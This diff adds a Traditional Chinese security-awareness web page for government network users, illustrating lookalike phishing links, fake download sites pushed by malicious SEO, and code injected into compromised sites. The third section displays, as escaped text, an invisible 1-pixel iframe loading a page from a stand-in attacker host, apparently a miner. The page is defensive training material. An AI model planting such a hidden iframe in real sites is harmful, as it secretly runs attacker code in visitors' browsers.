@@ -1,0 +1,253 @@
+<!DOCTYPE html>
+<html lang="zh-TW">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>公務網路環境上網安全行為準則</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700&family=Noto+Sans+TC:wght@400;500;700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Inter', 'Noto Sans TC', sans-serif;
+        }
+        .card {
+            background-color: white;
+            border-radius: 0.75rem;
+            box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05);
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+        }
+        .card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.1), 0 10px 10px -5px rgba(0, 0, 0, 0.04);
+        }
+        .interactive-element {
+            border: 1px dashed #cbd5e1;
+            padding: 1rem;
+            border-radius: 0.5rem;
+            margin-top: 1rem;
+            background-color: #f8fafc;
+        }
+        .tooltip {
+            position: absolute;
+            background-color: #1e293b;
+            color: white;
+            padding: 0.5rem 0.75rem;
+            border-radius: 0.375rem;
+            font-size: 0.875rem;
+            z-index: 10;
+            opacity: 0;
+            transition: opacity 0.3s ease;
+            pointer-events: none;
+            bottom: 125%;
+            left: 50%;
+            transform: translateX(-50%);
+            white-space: nowrap;
+        }
+        .tooltip-container:hover .tooltip {
+            opacity: 1;
+        }
+        .fake-search-result:hover {
+            background-color: #f0f9ff;
+        }
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-color: rgba(0, 0, 0, 0.5);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 50;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.3s ease-in-out;
+        }
+        .modal-content {
+            background-color: white;
+            padding: 2rem;
+            border-radius: 0.75rem;
+            max-width: 500px;
+            width: 90%;
+            transform: scale(0.95);
+            transition: transform 0.3s ease-in-out;
+        }
+        .modal-overlay.active {
+            opacity: 1;
+            pointer-events: auto;
+        }
+        .modal-overlay.active .modal-content {
+            transform: scale(1);
+        }
+    </style>
+</head>
+<body class="bg-slate-50 text-slate-800">
+
+    <!-- Header -->
+    <header class="bg-white shadow-sm">
+        <div class="container mx-auto px-6 py-8 text-center">
+            <h1 class="text-3xl md:text-4xl font-bold text-slate-900">公務網路環境上網安全行為準則</h1>
+            <p class="mt-4 text-lg text-slate-600">維護公務網路信譽，你我人人有責</p>
+        </div>
+    </header>
+
+    <!-- Main Content -->
+    <main class="container mx-auto px-6 py-12">
+        <div class="text-center mb-12">
+            <h2 class="text-2xl font-bold">當前三大主要網路威脅</h2>
+            <p class="mt-2 text-slate-500">了解這些陷阱，保護我們的數位環境。</p>
+        </div>
+
+        <!-- Threats Grid -->
+        <div class="grid md:grid-cols-3 gap-8">
+
+            <!-- Threat 1: Phishing URL -->
+            <div class="card p-6">
+                <div class="flex items-center">
+                    <div class="p-3 bg-red-100 rounded-full">
+                        <svg class="w-6 h-6 text-red-500" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"></path><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"></path></svg>
+                    </div>
+                    <h3 class="ml-4 text-xl font-bold">威脅一：以假亂真的網址陷阱</h3>
+                </div>
+                <p class="mt-4 text-slate-600">攻擊者利用與合法網站極度相似的「偽冒網址」來誘騙您，目的是竊取您的帳號密碼。</p>
+                <div class="interactive-element">
+                    <p class="font-semibold text-center">互動體驗：懸停查看真相</p>
+                    <p class="mt-2 text-sm text-slate-500">您收到一封郵件，內含一個連結。它看起來是安全的，但真的如此嗎？</p>
+                    <div class="mt-4 text-center">
+                        <div class="relative inline-block tooltip-container">
+                            <a href="#" onclick="event.preventDefault();" class="text-blue-600 hover:underline font-mono">
+                                前往 google.com 更新您的帳戶
+                            </a>
+                            <div class="tooltip font-mono">真實連結: g00gle-security.com</div>
+                        </div>
+                    </div>
+                </div>
+                <div class="mt-4">
+                    <h4 class="font-semibold">防範之道：</h4>
+                    <p class="mt-1 text-sm text-slate-500">點擊前，將滑鼠懸停在連結上，檢查瀏覽器左下角顯示的真實網址。若有疑慮，請手動輸入官方網址。</p>
+                </div>
+            </div>
+
+            <!-- Threat 2: Malicious SEO -->
+            <div class="card p-6">
+                 <div class="flex items-center">
+                    <div class="p-3 bg-amber-100 rounded-full">
+                        <svg class="w-6 h-6 text-amber-500" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path></svg>
+                    </div>
+                    <h3 class="ml-4 text-xl font-bold">威脅二：搜尋引擎的信任陷阱</h3>
+                </div>
+                <p class="mt-4 text-slate-600">攻擊者利用「惡意SEO」技術，將偽冒網站推上搜尋結果頂端，使其看起來像官方結果。</p>
+                <div class="interactive-element">
+                    <p class="font-semibold text-center">互動體驗：點擊危險連結</p>
+                    <p class="mt-2 text-sm text-slate-500">您搜尋「7-Zip 繁體中文版下載」，哪個才是官方網站？</p>
+                    <div class="mt-4 space-y-3">
+                        <div id="safe-link" class="fake-search-result p-3 rounded-lg cursor-pointer border border-transparent">
+                            <p class="font-semibold text-blue-800">7-Zip 官方網站</p>
+                            <p class="text-sm text-green-600">https://www.7-zip.org</p>
+                            <p class="text-xs text-slate-500">正版軟體的官方來源，安全可靠。</p>
+                        </div>
+                        <div id="malicious-link" class="fake-search-result p-3 rounded-lg cursor-pointer border border-transparent">
+                            <p class="font-semibold text-blue-800">7-Zip 繁體中文版免費下載</p>
+                            <p class="text-sm text-green-600">https://www.get-7zip-free.com</p>
+                            <p class="text-xs text-slate-500">一鍵下載，立即安裝！最新版本，完全免費。</p>
+                        </div>
+                    </div>
+                </div>
+                 <div class="mt-4">
+                    <h4 class="font-semibold">防範之道：</h4>
+                    <p class="mt-1 text-sm text-slate-500">養成「驗證網域」的習慣。點擊前，仔細核對是否為官方網域。堅持前往官方網站下載軟體。</p>
+                </div>
+            </div>
+
+            <!-- Threat 3: Invisible Code -->
+            <div class="card p-6">
+                <div class="flex items-center">
+                    <div class="p-3 bg-sky-100 rounded-full">
+                        <svg class="w-6 h-6 text-sky-500" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 20l4-16m4 4l4 4-4 4M6 16l-4-4 4-4"></path></svg>
+                    </div>
+                    <h3 class="ml-4 text-xl font-bold">威脅三：看不見的惡意程式碼</h3>
+                </div>
+                <p class="mt-4 text-slate-600">即使是合法網站也可能被駭客入侵，植入惡意程式碼，在您瀏覽時於背景執行惡意行為。</p>
+                <div class="interactive-element">
+                    <p class="font-semibold text-center">互動體驗：揭露隱藏的程式碼</p>
+                    <p class="mt-2 text-sm text-slate-500">您正在瀏覽一個新聞網站，但頁面中可能隱藏著您看不見的東西。</p>
+                    <div class="mt-4 text-center">
+                        <button id="reveal-code-btn" class="bg-sky-500 text-white px-4 py-2 rounded-lg hover:bg-sky-600 transition-colors">點此查看網頁原始碼</button>
+                    </div>
+                    <div id="hidden-code" class="hidden mt-4 p-3 bg-gray-800 text-green-400 rounded-md text-xs font-mono overflow-x-auto">
+                        &lt;!-- A normal website content --&gt;<br>
+                        &lt;h1&gt;Today's News&lt;/h1&gt;<br>
+                        &lt;p&gt;Some interesting story...&lt;/p&gt;<br>
+                        <span class="text-red-400">&lt;!-- Malicious code hidden by attacker --&gt;<br>
+                        &lt;iframe src="http://evil-server.com/mine.html" style="width:1px; height:1px; opacity:0;"&gt;&lt;/iframe&gt;</span>
+                    </div>
+                </div>
+                <div class="mt-4">
+                    <h4 class="font-semibold">防範之道：</h4>
+                    <p class="mt-1 text-sm text-slate-500">關鍵在於「淨化您的上網範圍」。避免瀏覽與公務無關或高風險網站（如免費影音、P2P分享）。</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Conclusion -->
+        <div class="mt-16 text-center bg-white p-8 rounded-lg shadow-lg">
+            <h2 class="text-2xl font-bold">每位使用者都是網路安全的守門員</h2>
+            <p class="mt-4 max-w-3xl mx-auto text-slate-600">公務網路的安全與信譽，並非僅是資訊單位的責任，而是每一位使用者的共同使命。一個不經意的點擊，都可能造成嚴重後果。讓我們共同努力，透過謹慎的網路行為，確保公務網路的順暢、安全與可靠。</p>
+        </div>
+    </main>
+
+    <!-- Modal for malicious link -->
+    <div id="modal" class="modal-overlay">
+        <div class="modal-content text-center">
+            <svg class="w-16 h-16 text-red-500 mx-auto" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"></path></svg>
+            <h3 class="text-2xl font-bold mt-4">警告！</h3>
+            <p class="text-slate-600 mt-2">您點擊的連結 (<span class="font-mono text-red-600">get-7zip-free.com</span>) 並非官方網站！從此處下載的檔案可能捆綁了木馬或間諜軟體，將對您的電腦和網路環境造成威脅。</p>
+            <button id="close-modal-btn" class="mt-6 bg-red-500 text-white px-6 py-2 rounded-lg hover:bg-red-600 transition-colors">我明白了</button>
+        </div>
+    </div>
+
+    <script>
+        // --- Modal Logic ---
+        const modal = document.getElementById('modal');
+        const maliciousLink = document.getElementById('malicious-link');
+        const safeLink = document.getElementById('safe-link');
+        const closeModalBtn = document.getElementById('close-modal-btn');
+
+        maliciousLink.addEventListener('click', () => {
+            modal.classList.add('active');
+        });
+        
+        safeLink.addEventListener('click', () => {
+            alert('安全！您點擊的是官方網站 (7-zip.org)。');
+        });
+
+        const closeModal = () => {
+            modal.classList.remove('active');
+        }
+
+        closeModalBtn.addEventListener('click', closeModal);
+        modal.addEventListener('click', (event) => {
+            if (event.target === modal) {
+                closeModal();
+            }
+        });
+
+        // --- Hidden Code Logic ---
+        const revealBtn = document.getElementById('reveal-code-btn');
+        const hiddenCode = document.getElementById('hidden-code');
+
+        revealBtn.addEventListener('click', () => {
+            if (hiddenCode.classList.contains('hidden')) {
+                hiddenCode.classList.remove('hidden');
+                revealBtn.textContent = '隱藏原始碼';
+            } else {
+                hiddenCode.classList.add('hidden');
+                revealBtn.textContent = '點此查看網頁原始碼';
+            }
+        });
+    </script>
+</body>
+</html>
